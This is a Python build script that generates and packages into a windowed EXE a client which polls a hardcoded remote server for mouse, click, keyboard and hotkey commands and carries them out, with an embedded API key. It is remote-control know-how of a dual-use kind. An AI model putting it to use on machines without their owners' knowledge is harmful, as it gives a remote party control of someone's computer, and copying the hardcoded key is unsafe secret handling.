#!/usr/bin/env python3
"""
Build standalone EXE for client_receiver with embedded API config
Uses PyInstaller to create portable executable
"""

import os
import sys
import shutil
import subprocess
import json
from pathlib import Path

# ═══════════════════════════════════════════════════════════════════
# 🔧 BUILD CONFIGURATION
# ═══════════════════════════════════════════════════════════════════

PROJECT_NAME = "SK_PRO_Client"
PROJECT_VERSION = "4.2"

# Fixed API Config
API_CONFIG = {
    "server_url": "https://sender-production-32bc.up.railway.app",
    "user_api_key": "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV",
    "client_name": "SK_PRO_Client",
    "heartbeat_interval": 4,  # 3-5 seconds
    "offline_timeout": 25,     # Mark offline after 25 seconds
}

# ═══════════════════════════════════════════════════════════════════
# 🔨 BUILD SCRIPT
# ═══════════════════════════════════════════════════════════════════

def create_embedded_client():
    """Create client with embedded config"""
    
    embedded_code = f'''#!/usr/bin/env python3
"""
SK PRO Client v{PROJECT_VERSION} - Embedded Configuration
Built with PyInstaller
"""

import os
import sys
import time
import json
import requests
import threading
from datetime import datetime
import platform

# ═══════════════════════════════════════════════════════════════════
# 🔧 EMBEDDED API CONFIGURATION (FIXED)
# ═══════════════════════════════════════════════════════════════════

API_URL = "{API_CONFIG['server_url']}"
API_KEY = "{API_CONFIG['user_api_key']}"
CLIENT_NAME = "{API_CONFIG['client_name']}"
HEARTBEAT_INTERVAL = {API_CONFIG['heartbeat_interval']}  # 3-5 seconds
OFFLINE_TIMEOUT = {API_CONFIG['offline_timeout']}  # Mark offline after this seconds

# ═══════════════════════════════════════════════════════════════════
# 🎮 CONTROL COMMAND HANDLER
# ═══════════════════════════════════════════════════════════════════

class ControlCommandHandler:
    """Handle remote control commands"""
    
    @staticmethod
    def execute(cmd):
        """Execute control command"""
        try:
            cmd_type = cmd.get("type")
            data = cmd.get("data", {{}})
            
            print(f"[CLIENT] CONTROL: {{cmd_type}} {{data}}")
            
            if cmd_type == "ping_control":
                print("[CLIENT] ✓ PING OK")
            
            elif cmd_type == "mouse_move":
                x = int(data.get("x", 0))
                y = int(data.get("y", 0))
                try:
                    import pyautogui
                    pyautogui.moveTo(x, y)
                    print(f"[CLIENT] ✓ Mouse → ({{x}}, {{y}})")
                except Exception as e:
                    print(f"[CLIENT] ✗ Mouse error: {{e}}")
            
            elif cmd_type == "mouse_click":
                x = int(data.get("x", 0))
                y = int(data.get("y", 0))
                button = data.get("button", "left")
                try:
                    import pyautogui
                    pyautogui.click(x, y, button=button)
                    print(f"[CLIENT] ✓ Click ({{button}}) @ ({{x}}, {{y}})")
                except Exception as e:
                    print(f"[CLIENT] ✗ Click error: {{e}}")
            
            elif cmd_type == "double_click":
                x = int(data.get("x", 0))
                y = int(data.get("y", 0))
                try:
                    import pyautogui
                    pyautogui.doubleClick(x, y)
                    print(f"[CLIENT] ✓ Double click @ ({{x}}, {{y}})")
                except Exception as e:
                    print(f"[CLIENT] ✗ Double click error: {{e}}")
            
            elif cmd_type == "key_press":
                key = data.get("key", "")
                try:
                    import pyautogui
                    pyautogui.press(key)
                    print(f"[CLIENT] ✓ Key: {{key}}")
                except Exception as e:
                    print(f"[CLIENT] ✗ Key error: {{e}}")
            
            elif cmd_type == "hotkey":
                keys = data.get("keys", [])
                try:
                    import pyautogui
                    if len(keys) >= 2:
                        pyautogui.hotkey(*keys)
                        print(f"[CLIENT] ✓ Hotkey: {{'+'.join(keys)}}")
                except Exception as e:
                    print(f"[CLIENT] ✗ Hotkey error: {{e}}")
            
            else:
                print(f"[CLIENT] ⚠ Unknown: {{cmd_type}}")
            
            return {{"status": "ok"}}
        
        except Exception as e:
            print(f"[CLIENT] ✗ Error: {{e}}")
            return {{"status": "error"}}

# ═══════════════════════════════════════════════════════════════════
# 💓 HEARTBEAT - Keep ONLINE
# ═══════════════════════════════════════════════════════════════════

def send_heartbeat():
    """Send heartbeat to server"""
    headers = {{"x-api-key": API_KEY}}
    
    while True:
        try:
            os_info = platform.system() + " " + platform.release()
            
            resp = requests.post(
                f"{{API_URL}}/heartbeat",
                headers=headers,
                json={{
                    "username": CLIENT_NAME,
                    "os_info": os_info,
                    "current_status": "online"
                }},
                timeout=5
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("disconnect_requested"):
                    print("[CLIENT] DISCONNECT REQUESTED")
                    sys.exit(0)
                print(f"[CLIENT] 💓 Heartbeat OK ({{HEARTBEAT_INTERVAL}}s)")
            
            time.sleep(HEARTBEAT_INTERVAL)
        
        except Exception as e:
            print(f"[CLIENT] ✗ Heartbeat error: {{e}}")
            time.sleep(HEARTBEAT_INTERVAL)

# ═══════════════════════════════════════════════════════════════════
# 🎮 CONTROL POLLING
# ═══════════════════════════════════════════════════════════════════

def poll_control_commands():
    """Poll for commands"""
    headers = {{"x-api-key": API_KEY}}
    
    while True:
        try:
            resp = requests.get(
                f"{{API_URL}}/control/poll/{{CLIENT_NAME}}",
                headers=headers,
                timeout=5
            )
            
            if resp.status_code == 200:
                data = resp.json()
                events = data.get("events", [])
                
                if events:
                    print(f"[CLIENT] 📨 {{len(events)}} commands")
                    for evt in events:
                        ControlCommandHandler.execute(evt)
            
            time.sleep(0.5)
        
        except Exception as e:
            print(f"[CLIENT] ✗ Poll error: {{e}}")
            time.sleep(1)

# ═══════════════════════════════════════════════════════════════════
# 🚀 MAIN
# ═══════════════════════════════════════════════════════════════════

def main():
    """Main client loop"""
    print("╔════════════════════════════════════════════════════════════╗")
    print("║     SK PRO Client v{PROJECT_VERSION} - ONLINE MODE                 ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print(f"[CLIENT] Name: {{CLIENT_NAME}}")
    print(f"[CLIENT] API: {{API_URL}}")
    print(f"[CLIENT] Heartbeat: {{HEARTBEAT_INTERVAL}}s")
    print(f"[CLIENT] Offline timeout: {{OFFLINE_TIMEOUT}}s")
    print()
    
    # Start heartbeat thread
    hb = threading.Thread(target=send_heartbeat, daemon=True)
    hb.start()
    print("[CLIENT] ✓ Heartbeat started")
    
    # Start control polling thread
    ctrl = threading.Thread(target=poll_control_commands, daemon=True)
    ctrl.start()
    print("[CLIENT] ✓ Control polling started")
    
    print()
    print("[CLIENT] ✓ Client ONLINE and ready")
    print("[CLIENT] Press Ctrl+C to exit")
    print()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\\n[CLIENT] Shutting down...")
        sys.exit(0)

if __name__ == "__main__":
    main()
'''
    
    # Write embedded client
    with open("sk_pro_client_embedded.py", "w") as f:
        f.write(embedded_code)
    
    print("✅ Created sk_pro_client_embedded.py with embedded config")

def build_exe():
    """Build EXE using PyInstaller"""
    
    try:
        # Check if PyInstaller is installed
        subprocess.run(["pyinstaller", "--version"], capture_output=True, check=True)
    except:
        print("Installing PyInstaller...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller", "--break-system-packages"], check=True)
    
    print("\n🔨 Building EXE with PyInstaller...")
    
    # Build command
    cmd = [
        "pyinstaller",
        "--onefile",  # Single EXE
        "--windowed",  # No console
        "--name", "SK_PRO_Client",
        "--icon", "app_icon.ico" if os.path.exists("app_icon.ico") else None,
        "--hidden-import=requests",
        "--hidden-import=pyautogui",
        "--add-data", "sk_pro_client_embedded.py:.",
        "sk_pro_client_embedded.py"
    ]
    
    cmd = [x for x in cmd if x]  # Remove None values
    
    result = subprocess.run(cmd)
    
    if result.returncode == 0:
        print("✅ EXE built successfully!")
        
        # Copy to dist
        if os.path.exists("dist/SK_PRO_Client.exe"):
            print(f"✅ Location: {os.path.abspath('dist/SK_PRO_Client.exe')}")
            return True
    else:
        print("❌ Build failed")
        return False

def main():
    """Build process"""
    print("╔════════════════════════════════════════════════════════════╗")
    print("║     SK PRO Client Builder - EXE Generator                  ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print()
    
    # Create embedded client
    create_embedded_client()
    
    # Build EXE
    if build_exe():
        print("\n✅ BUILD COMPLETE!")
        print()
        print("📦 Output: dist/SK_PRO_Client.exe")
        print()
        print("Configuration:")
        print(f"  Server: {API_CONFIG['server_url']}")
        print(f"  API Key: {API_CONFIG['user_api_key'][:20]}...")
        print(f"  Heartbeat: {API_CONFIG['heartbeat_interval']}s")
        print(f"  Offline timeout: {API_CONFIG['offline_timeout']}s")
        print()
        print("Ready to distribute! 🚀")
    else:
        print("\n❌ Build failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
